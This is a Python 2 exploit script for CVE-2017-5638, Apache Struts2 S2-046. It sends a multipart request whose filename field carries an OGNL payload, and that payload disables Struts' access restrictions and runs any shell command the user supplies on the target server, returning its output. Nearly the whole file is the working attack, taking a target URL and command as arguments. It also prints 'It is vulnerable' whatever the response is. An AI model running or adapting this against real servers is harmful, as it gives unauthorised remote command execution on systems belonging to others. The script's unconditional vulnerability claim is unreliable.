#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2
import httplib

def exploit(url, cmd):
    boundary = "---------------------------WEBKIT198919991920098822555"  
    content_type = "multipart/form-data; boundary=%s" % boundary
    payload = "--%s\r\n" % boundary
    payload += "Content-Disposition: form-data; name=\"foo\"; filename=\""
    payload += "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}\x00b\"\r\n"
    payload += "Content-Type: text/plain\r\n\r\nzzzzz\r\n--%s--\r\n\r\n" % boundary

    try:
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': content_type}
	Attack_data = payload 
        request = urllib2.Request(url, headers=headers, data=Attack_data)
        page = urllib2.urlopen(request).read()
      
    except httplib.IncompleteRead, e:
        page = e.partial
        print("Error Code")
    

    print(page)
    print("\r\nIt is vulnerable")
    return page

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 3:
        print("[*] struts2_S2-046.py")
	print("Please input target url and command")
    else:
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-046')
        url = sys.argv[1]
	cmd = sys.argv[2]
	print("[*] cmd: %s\n" % cmd)
        exploit(url, cmd)
